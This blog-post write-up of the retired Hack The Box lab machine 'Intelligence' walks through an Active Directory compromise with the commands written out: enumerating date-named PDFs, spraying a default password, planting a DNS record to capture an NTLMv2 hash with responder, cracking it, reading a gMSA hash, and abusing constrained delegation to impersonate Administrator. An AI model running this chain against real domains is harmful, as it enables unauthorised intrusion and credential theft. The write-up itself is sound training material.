---
layout: post
title: "The Filename Was the Map"
subtitle: "HTB Intelligence, where a date in a URL leaks a wall of PDFs, a default password opens the domain, and a service account you can read becomes Administrator"
date: 2021-12-04 12:00:00 +0000
description: "A predictable filename leaks a hundred documents, one of them hands out the default password, and a service account nobody guarded walks you to Administrator."
image: /assets/og/the-filename-was-the-map.png
tags: [hackthebox, writeup]
---

Intelligence is a paper trail. The box leaves two PDFs on its front page, and the only thing that matters about them is their names, because the names are dates and dates count. You guess the next date, and the next, and the server hands you a hundred documents nobody meant to publish. One of those documents tells every new hire the password they all start with. From there it is pure Active Directory, the quiet kind, where nothing explodes and every step is just a permission someone granted to the wrong account. You spray a password, you plant a DNS record so a scheduled task phones your machine instead of its own, you catch the hash it brings, and you finish on a service account that was allowed to pretend to be anyone. No memory corruption anywhere. Just a directory full of accounts trusting each other a little too much.

```
        I N T E L L I G E N C E
        =======================
        /documents/2020-01-01-upload.pdf   ← on the page
        /documents/2020-12-15-upload.pdf   ← on the page
        /documents/2020-06-04-upload.pdf   ← NOT on the page
                |                              you guessed the date
                v
        a hundred PDFs fall out of the calendar.
        one of them: "default password is ..."
                |
                v
        spray it. plant a dns name. catch a hash.
        read a service account. become anyone.
                                            档
```

## 0x01 · the lobby

`nmap` comes back loud and unmistakably a domain controller. DNS, Kerberos, LDAP in all its flavors, SMB, and an IIS site on 80.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap
3268/tcp open  ldap
9389/tcp open  mc-nmf        .NET Message Framing
```

Kerberos on 88 and LDAP on 389 next to a web server is the signature of a Windows domain controller, and the domain announces itself as `intelligence.htb`. Picture the office building for a whole company. The DC is the front desk that knows every employee, every door code, and who is allowed where. Get the front desk to vouch for you and the building is yours. That is the game from here on.

## 0x02 · the calendar

The website is a corporate brochure with two documents linked on it, sitting under `/documents/`.

```
http://10.10.10.248/documents/2020-01-01-upload.pdf
http://10.10.10.248/documents/2020-12-15-upload.pdf
```

Stare at those names for a second. They are dates, `YYYY-MM-DD-upload.pdf`, and a date is the most guessable thing in the world. The directory itself returns 403 when you ask for a listing, which feels like a locked door, but it is not a lock at all. It only stops you from seeing the index. Every individual file is still reachable if you can name it, and the naming scheme is a calendar.

Think of it like a hotel that hides the guest registry but numbers the rooms one through three hundred. You cannot read the list of who is staying there. You do not need to. You just knock on every door. So you write a few lines of Python that walk every date across roughly eighteen months and fetch each one, keeping the responses that come back as real PDFs.

```
for day in every_date("2020-01-01", "2021-07-04"):
    url = f"http://10.10.10.248/documents/{day}-upload.pdf"
    r = requests.get(url)
    if r.ok and r.content[:4] == b"%PDF":
        save(url, r.content)
```

Around seventy-five files fall out of the calendar. Most are filler. You are not going to read seventy-five PDFs by hand, so you let `PyPDF2` rip the text out of each and grep the pile for the words that matter. `password`, `account`, `default`, `login`.

```
$ grep -ril "password" pdf_text/
2020-06-04-upload.pdf:  ... the default password of NewIntelligenceCorpUser9876
```

One document, an onboarding note that was never meant to be public, tells every new employee the password they all start with. `NewIntelligenceCorpUser9876`. A shared starting password is a gift, because somewhere in a company that size, somebody never changed theirs.

## 0x03 · the roster

A password is only half a credential. You need names to try it against. The PDFs carry those too, not in the text but stamped into the file metadata, the little author tag every document drags around. `exiftool` reads it straight off.

```
$ exiftool -Creator -S pdf_files/*.pdf | grep Creator | sort -u
Creator: William.Lee
Creator: Jose.Williams
Creator: Tiffany.Molina
... about thirty names in firstname.lastname form
```

Roughly thirty real domain usernames, harvested from the corner of a file nobody thinks about. Validate them against Kerberos with `kerbrute` so you are not spraying ghosts, then spray the one default password across the whole roster with `crackmapexec`.

```
$ crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB  10.10.10.248  445  DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

One name lit up green. Tiffany.Molina never changed the password they were handed on day one. That is the whole foothold, and it is enough to read the file shares and pick up the user flag.

```
$ smbclient.py intelligence.htb/Tiffany.Molina:'NewIntelligenceCorpUser9876'@10.10.10.248
# user.txt
████████████████████████████████
```

## 0x04 · the note in the share

Tiffany can read an `IT` share, and inside it is a PowerShell script someone left lying around, `downdetector.ps1`. Read it like a confession. It loops over every DNS record in the domain whose name starts with `web`, makes an HTTP request to each one, and it runs on a timer, every five minutes, under a service account's credentials.

```
# downdetector.ps1, paraphrased
foreach ($record in Get-DnsServerResourceRecord ...) {
    if ($record.HostName.StartsWith("web")) {
        Invoke-WebRequest -UseDefaultCredentials -Uri "http://$($record.HostName)"
    }
}
```

That `-UseDefaultCredentials` is the entire vulnerability. It means the scheduled task will authenticate to whatever web server it contacts, automatically, as the account it runs under. The script trusts DNS to tell it where the real `web` servers live. But in this domain, an authenticated user is allowed to create DNS records. So nothing stops you from inventing a brand new host named `web-iceberg`, pointing it at your own machine, and waiting for the task to come knocking with credentials in hand.

Picture a night watchman with a rule. Every five minutes, walk to every address on this list whose name starts with "web," knock, and show your badge to prove who you are. Now imagine you can add your own address to that list. He walks to your door, knocks, and flashes the badge. You do not have to steal it. He shows it to you on schedule.

## 0x05 · the planted name

You add the DNS record with `dnstool.py` from the krbrelayx toolkit, using Tiffany's credentials, pointing your new `web` host at your attacker IP.

```
$ dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' \
    --action add --record web-iceberg --data 10.10.14.4 --type A 10.10.10.248
[+] Adding new record
[+] LDAP operation completed successfully
```

Then you sit on the line with `responder`, which answers the incoming HTTP authentication and records the NTLMv2 hash the task offers up. Within five minutes the watchman knocks.

```
$ responder -I tun0
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E0...
```

The service account behind the timer is Ted.Graves. An NTLMv2 hash is not the password, it is a one-way scramble of it mixed with a random challenge, so you cannot replay it directly here. You crack it offline. `hashcat` in mode 5600 chews through a wordlist and the password is almost insultingly human.

```
$ hashcat -m 5600 ted.hash rockyou.txt
TED.GRAVES::intelligence:...:Mr.Teddy
```

`Mr.Teddy`. Now you own a second account, and this one has friends.

## 0x06 · the account that could be anyone

Run `bloodhound` over the domain with Ted's credentials and the path lights up like an exit sign. Ted.Graves belongs to a group called `ITSupport`, and `ITSupport` holds `ReadGMSAPassword` over a service account named `svc_int$`.

A gMSA, a group managed service account, is an account whose password the domain controller generates and rotates by itself, so no human ever types it. The catch is that certain accounts are allowed to read that machine-generated password on demand, and Ted is one of them. Pull it with `gMSADumper.py`.

```
$ gMSADumper.py -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb
Users or groups who can read password for svc_int$:
 > ITSupport
svc_int$:::5e47bac787e5e1970cf9acdb5b316239
```

Now the last hop. `svc_int$` is configured for constrained delegation, allowed to delegate to the SPN `www/dc.intelligence.htb`. Constrained delegation is a feature where one account is trusted to request tickets for a service on behalf of other users, so a web frontend can act as you against a database without holding your password. The danger is the impersonation reaches anyone, including Administrator, and nothing checks whether the person being impersonated ever agreed to it.

Think of it like a valet pass that does not just fetch your car. It lets the valet sign for your car under any guest's name, including the owner's. Use `getST.py` from Impacket to do exactly that. Feed it the gMSA hash, the delegation SPN, and the name you want to wear.

```
$ getST.py -spn 'www/dc.intelligence.htb' -impersonate Administrator \
    -hashes :5e47bac787e5e1970cf9acdb5b316239 intelligence.htb/svc_int$
[*] Impersonating Administrator
[*] Saving ticket in Administrator.ccache
```

That ticket is Administrator, minted through S4U2Self and S4U2Proxy without ever knowing Administrator's password. Load it and walk in with `wmiexec.py`.

```
$ KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
intelligence\administrator
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Nothing on Intelligence is an exploit in the sense people imagine. There is no overflow, no shellcode, no CVE with a logo. Every single step is a feature being used exactly as designed, by the wrong person, in the wrong order.

The PDFs were meant to be public, so 403 on the directory felt like enough. It was not, because predictable filenames make a hidden index pointless. The default password was a convenience for onboarding, and it stayed valid because changing it was a chore nobody enforced. Letting users add DNS records is a normal domain setting. Running a scheduled task with default credentials is normal automation. gMSAs exist precisely so passwords are never typed. Constrained delegation exists so services can act for users. Each one is a reasonable line item on its own. Stacked together they form a staircase from an anonymous web visitor to domain Administrator, and not one stair is broken. They were all built that way on purpose.

That is the part worth losing sleep over. You cannot patch this with an update on a Tuesday. There is no missing fix. The whole climb is configuration, the slow accumulation of small permissions granted to accounts that did not strictly need them, secrets left in metadata and file shares because someone assumed nobody would look. The fix is not a download. It is somebody auditing who can read what, and asking, for every trust in the directory, whether it was ever actually necessary.

## 0x08 · outro

```
the front desk hid the registry and numbered the rooms.
you knocked on every door the calendar named.
one room held the password the whole company shared.

then the watchman walked to an address you invented,
and showed you the badge on a five-minute timer.
the last account could sign for the car under any name.

nothing broke. every door was built to open. wear black.

                                                            EOF
```

---

*HTB: Intelligence, retired 27 Nov 2021. A medium Windows box that is really a lecture on configuration debt, where a guessable filename and a chain of reasonable permissions walk an anonymous visitor all the way to Administrator. The calendar still leaks in a lab and nowhere you don't own.*